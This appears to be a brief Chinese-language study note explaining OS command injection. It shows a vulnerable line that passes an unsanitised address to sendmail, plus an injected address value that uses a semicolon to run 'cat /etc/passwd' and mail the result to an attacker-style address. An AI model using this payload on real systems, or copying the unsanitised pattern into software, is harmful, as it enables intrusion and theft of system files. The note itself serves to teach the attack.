OS注入攻击

执行非法的操作系统命令达到攻击

案例：

利用； 破坏shell函数结构

```shell
open(MAIL, "| /usr/sbin/sendmail $adr")

// 邮件地址
;cat /etc/passwd | mail hack@example.jp
```

